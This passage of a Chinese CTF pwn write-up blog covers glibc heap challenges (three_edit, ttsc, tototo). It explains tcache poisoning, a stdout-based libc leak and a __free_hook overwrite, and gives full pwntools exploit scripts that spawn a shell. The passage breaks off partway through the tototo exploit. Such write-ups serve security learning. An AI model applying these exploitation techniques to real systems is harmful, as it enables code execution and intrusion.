class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc_base=&quot;</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="string">&quot;tache_attack&quot;</span>,p64(libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]<span class="number">-8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;none&quot;</span>,b<span class="number">&#x27;</span> <span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(&quot;free_hook&quot;,b&#x27;</span>/bin/sh\<span class="number">0&#x27;</span>+p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="string">&quot;free_hook&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="three-edit"><a href="#three-edit" class="headerlink" title="three_edit"></a>three_edit</h4><ul><li>题目是一个heap类题目(glibc.2.31)，但是没有输出函数，通过观察发现在edit函数输入下标时，程序只进行了<code>n&gt;14</code>的检查，我们可以通过计算输入负数对，<code>tcache_bins</code>里面的chunk进行改写</li></ul><p><img src="https://s2.loli.net/2023/04/11/cABNJximbeKUfaV.png"></p><h5 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h5><ul><li>值得我们注意的是<code>tcache_bins</code>并不是在main_arena上面的而是在<code>tcache_perthread_struct</code>这个结构里面，而他实际上就是我们malloc时tcache首先初始化的一个chunk(0x290)</li></ul><p><img src="https://s2.loli.net/2023/04/11/G1pwdSRfF7rsvlP.png"></p><ul><li><p>题目没有输出函数，我们可以使用<code>_IO_2_1_stdout_</code>进行泄露，所以需要构造出重叠将<code>main_arena+offset</code>的地址写入tcache中通低位覆盖爆破成<code>_IO_2_1_stdout_</code>然后<code>tcache_attack</code>申请出来</p></li><li><p>最后故技重施，通过edit函数漏洞，释放两个<code>tcache_chunk</code>,打<code>tcache_attack</code>申请出<code>free_hook</code>改写成<code>system</code></p></li></ul><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="meta">#c=remote(b<span class="string">&#x27;121.40.89.206&#x27;</span>,34883) </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=ELF(b<span class="number">&#x27;</span>/lib/x86_64-linux-gnu/libc.so<span class="number">.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def debg():</span><br><span class="line">gdb.attach(c,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">b *$rebase(<span class="number">0x17A5</span>)</span><br><span class="line">b *$rebase(<span class="number">0x15e0</span>)</span><br><span class="line">b *$rebase(<span class="number">0x178d</span>)</span><br><span class="line">b *$rebase(<span class="number">0x14f7</span>)</span><br><span class="line">b *$rebase(<span class="number">0x1799</span>)</span><br><span class="line">b *$rebase(<span class="number">0x16a1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(idx, size, cnt):</span><br><span class="line">    c.sendlineafter(b<span class="number">&#x27;</span>is:<span class="string">&#x27;, b&#x27;</span><span class="number">1&#x27;</span>)</span><br><span class="line">    c.sendlineafter(b<span class="number">&#x27;</span>index:<span class="string">&#x27;, str(idx).encode())</span></span><br><span class="line"><span class="string">    c.sendlineafter(b&#x27;</span>size:<span class="string">&#x27;, str(size).encode())</span></span><br><span class="line"><span class="string">    c.sendlineafter(b&#x27;</span>content:<span class="string">&#x27;, cnt)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">def free(idx):</span></span><br><span class="line"><span class="string">    c.sendlineafter(b&#x27;</span>is:<span class="string">&#x27;, b&#x27;</span><span class="number">2&#x27;</span>)</span><br><span class="line">    c.sendlineafter(b<span class="number">&#x27;</span>index?<span class="string">&#x27;, str(idx).encode())</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">def edit(idx, cnt):</span></span><br><span class="line"><span class="string">    c.sendlineafter(b&#x27;</span>is:<span class="string">&#x27;, b&#x27;</span><span class="number">3&#x27;</span>)</span><br><span class="line">    c.sendlineafter(b<span class="number">&#x27;</span>index?<span class="string">&#x27;, str(idx).encode())</span></span><br><span class="line"><span class="string">    c.sendlineafter(b&#x27;</span>new content:<span class="string">&#x27;, cnt)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def run():</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(11):</span></span><br><span class="line"><span class="string">add(i, 0x70, b&#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">edit(0, b&#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">edit(1, b&#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">free(0)</span></span><br><span class="line"><span class="string">free(10)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">edit(-60, b&#x27;</span>\xf0<span class="number">&#x27;</span>) #<span class="number">1</span>/<span class="number">16</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x70</span>, b<span class="number">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x70</span>, p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">0x481</span>))#改写chunk1为一个释放后不会进入tcache的chunk且要改写之后要保证chunk1+<span class="number">0x480</span>是一个正确chunk的地址也就是说改写的size大小后面需要有一个正确的chunk否则会报错</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]:</span><br><span class="line"><span class="built_in">free</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]:</span><br><span class="line">add(i, <span class="number">0x50</span>, b<span class="number">&#x27;&#x27;</span>)#这里需要计算前面释放的<span class="number">3</span>个chunk为<span class="number">0x80</span>*<span class="number">3</span>,我们需要让unsorted chunk中的libc地址落到chunk4里面，那么就需要申请<span class="number">0x50</span>*<span class="number">4</span>,这样才会相等，如果前面我们释放<span class="number">2</span>个<span class="number">0x80</span>的话我们后面申请的chunk无法等于<span class="number">0x100</span>,题目限制了申请chunk的大小</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x60</span>, p16(<span class="number">0x66a0</span>))#此时chunk4里面已经有了libc地址，我们随便申请一个比<span class="number">0x70</span>小的chunk然后低位改写就好了，不能相等</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x70</span>, b<span class="number">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x70</span>, p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span> + p8(<span class="number">0</span>)) <span class="meta">#stdout</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stdin_addr = c.recvuntil(b<span class="number">&#x27;</span>\x7f<span class="number">&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base=u64(stdin_addr[<span class="number">-6</span>:].ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))-libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc_base=&quot;</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">-60</span>,p64(libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]<span class="number">-8</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x70</span>,b<span class="number">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x70</span>,b<span class="number">&#x27;</span>/bin/sh\<span class="number">0&#x27;</span>+p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(b<span class="number">&#x27;l</span>s<span class="number">&#x27;</span>)</span><br><span class="line">c.recv()</span><br><span class="line">c.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__  == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">c=process(b<span class="number">&#x27;.</span>/pwn4<span class="number">&#x27;</span>)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">run()</span><br><span class="line">except Exception:</span><br><span class="line">c.close()</span><br><span class="line">c.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="tototo"><a href="#tototo" class="headerlink" title="tototo"></a>tototo</h4><h4 id="ttsc"><a href="#ttsc" class="headerlink" title="ttsc"></a>ttsc</h4><p>因为强制类型转换可以申请出限制范围之外的chunk，但是这边没有用这个点，同一时间只能存在4个chunk</p><p><img src="https://s2.loli.net/2023/04/11/LWQFD7GAesXvBmC.png"></p><p>off by one</p><p><img src="https://s2.loli.net/2023/04/11/sqWDgeJM9CUHScb.png"></p><h5 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h5><ol><li>利用堆重叠修改size使其释放后进入<code>unsorted bin</code></li><li>通过切割<code>unsorted bin</code>使其libc地址落入tcache中</li><li>改写tcache中的fd为<code>_IO_2_1_stdout_</code>申请出来进行泄露libc地址</li><li>再次利用<code>tcache attack</code>申请<code>__free_hook</code>写入system与<code>/bin/sh</code>获取sh</li></ol><h5 id="堆布局"><a href="#堆布局" class="headerlink" title="堆布局"></a>堆布局</h5><p>heap题目中最重要的其实就是heap布局，即使有思路如果布局不对那么很难写出来且改来改去非常头疼，离谱一点甚至会把exp全部推翻</p><ol><li>通过上面的思路我们现在整理一下，首先申请两个<code>tcache_chunk</code>，利用<code>chunk0</code>修改<code>chunk1</code>此时在<code>tcache_bin</code>中的<code>该chunk</code>只要申请出来就会造成重叠(不用立马申请)</li><li>我们的目的是通过chunk1的重叠改写<code>chunk2的size</code>释放并进入<code>unsorted_chunk</code>我们需要通过<code>chunk1的重叠</code>改写<code>chunk2的size</code>使其释放后进入<code>tcache</code>那么我们就需要通过修改后的<code>size</code>大小确定我们需要创建多少chunk和多大的chunk并释放绕过<code>unsorted_bin的检查</code>(最近边做题边整理不同libc利用的一些细节和保护)</li><li>申请并释放chunk绕过unsorted_chunk检查时就需要立马考虑，我们的目的是为了切割他然后的libc地址落入<code>tcache_fd</code>中所以进行申请和释放操作绕过保护时就直接释放和申请同一个chunk形成tcachebin中的链表(eg：0x80)，后面就可以通过申请chunk顺利使其进入<code>tcache_fd</code></li><li><code>tcache_fd</code>还需要我们覆写低位进行爆破，我们只需要随便申请一个大小(eg：0x40)的chunk申请其中的一部分进行覆写就ok了，此时<code>tcache_fd</code>改为了<code>_IO_2_1_stdout_</code>，申请两次chunk就可以申请出来并进行改写了</li><li>得到libc后，还需要再打一次<code>tcache_attack</code>，这个时候想到覆写时申请的(0x40)，他与申请两次的第一个chunk又进行了一次重叠，也就是说后面只需要将0x40释放掉，就可以通过第四步申请的第一个chunk改写其fd为<code>free_hook</code>改写成system即可(注意前面这个操作时tcachebins里面需要有2个chunk否则申请不出来)</li></ol><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./ttsc&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/davis/Desktop/libc_replace/libc_ch/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debg():</span><br><span class="line">gdb.attach(c,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">b <span class="built_in">malloc</span></span><br><span class="line">b <span class="built_in">free</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">def add(idx, size, msg=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>):</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>chs:<span class="string">&#x27;, b&#x27;</span><span class="number">1&#x27;</span>)</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>index?\n<span class="number">&#x27;</span>, str(idx).encode())</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>size:\n<span class="number">&#x27;</span>, str(size).encode())</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">c.send(msg)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"> </span><br><span class="line">def <span class="built_in">free</span>(idx):</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>chs:<span class="string">&#x27;, b&#x27;</span><span class="number">2&#x27;</span>)</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>index?<span class="string">&#x27;, str(idx).encode())</span></span><br><span class="line"><span class="string">sleep(0.1)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">def edit(idx, msg):</span></span><br><span class="line"><span class="string">c.sendlineafter(b&#x27;</span>chs:<span class="string">&#x27;, b&#x27;</span><span class="number">3&#x27;</span>)</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>index?<span class="string">&#x27;, str(idx).encode())</span></span><br><span class="line"><span class="string">c.sendlineafter(b&#x27;</span>content:<span class="string">&#x27;, msg)</span></span><br><span class="line"><span class="string">sleep(0.1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def run():</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c.sendafter(b&#x27;</span>?\n<span class="number">&#x27;</span>, b<span class="number">&#x27;</span>deadbeef<span class="number">&#x27;</span>)</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>?\n<span class="number">&#x27;</span>, b<span class="number">&#x27;123&#x27;</span>)</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>?\n<span class="number">&#x27;</span>, b<span class="number">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#<span class="number">20</span>,<span class="number">20</span>(<span class="number">30</span>),<span class="number">80</span>*<span class="number">4</span>,<span class="number">70</span>*<span class="number">4</span>,<span class="number">60</span>*<span class="number">4</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s in [<span class="number">0x80</span>,<span class="number">0x70</span>,<span class="number">0x60</span>]:</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">add(i, s<span class="number">-8</span>)</span><br><span class="line"><span class="keyword">for</span> i in [<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>]:</span><br><span class="line"><span class="built_in">free</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x78</span>) #<span class="number">5</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0x31</span>)) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x28</span>, p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x481</span>)+ b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>)<span class="meta">#change the size of chunk2</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#debg()</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x38</span>, p16(<span class="number">0x3760</span>))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x78</span>, p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0xc8</span>))</span><br><span class="line"></span><br><span class="line">libc_base = u64(c.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))-libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc_base=&quot;</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]<span class="number">-8</span>))</span><br><span class="line"></span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>chs:<span class="string">&#x27;, b&#x27;</span><span class="number">1&#x27;</span>)</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>index?<span class="string">&#x27;, str(0).encode())</span></span><br><span class="line"><span class="string">c.sendlineafter(b&#x27;</span>size:<span class="string">&#x27;, str(0x38).encode())</span></span><br><span class="line"><span class="string">sleep(0.1)</span></span><br><span class="line"><span class="string">c.send(b&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>chs:<span class="string">&#x27;, b&#x27;</span><span class="number">1&#x27;</span>)</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>index?<span class="string">&#x27;, str(3).encode())</span></span><br><span class="line"><span class="string">c.sendlineafter(b&#x27;</span>size:<span class="string">&#x27;, str(0x38).encode())</span></span><br><span class="line"><span class="string">sleep(0.1)</span></span><br><span class="line"><span class="string">c.send(b&#x27;</span>/bin/sh\<span class="number">0&#x27;</span>+p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line">c.send(b<span class="number">&#x27;</span>cat flag<span class="number">&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">c=process(b<span class="number">&#x27;.</span>/ttsc<span class="number">&#x27;</span>)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">run()</span><br><span class="line">except Exception:</span><br><span class="line">c.close()</span><br><span class="line">c.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#不知道为啥前面执行的时候很正确，泄露出libc之后后面程序就没有输出\n了，所以后面就没有用定义的函数</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="tototo-1"><a href="#tototo-1" class="headerlink" title="tototo"></a>tototo</h4><ol><li>题目禁用了<code>free_hook</code>和<code>execve</code></li><li>有uaf但是用处不大，因为free时会检查标记为</li><li>show没有检查标记，会直接输出释放后的chunk</li><li>edit没有检查标记，可以直接修改free后的chunk</li></ol><h5 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h5><ol><li>禁用了<code>execve</code>那就打orw泄露输出flag即可</li><li>利用show直接泄露libc和heap地址</li><li>改写<code>unsorted_chunk</code>的fd为<code>_environ</code>申请出来并泄露stack地址</li><li>通过泄露的stack地址计算edit里面真正写入函数的返回地址(rip)为orw即得到flag</li></ol><p>注：看rip的位置最好是进入到对应函数走到leave时再去看栈这样是不会错的，其次我们申请stack的时候只能申请0x150，其他都不行，原因是写入的时候会改掉一些函数用来记录计数或者是记录写入基地址的空间导致写入时会出现问题，具体慢慢调试也知道的</p><h5 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span 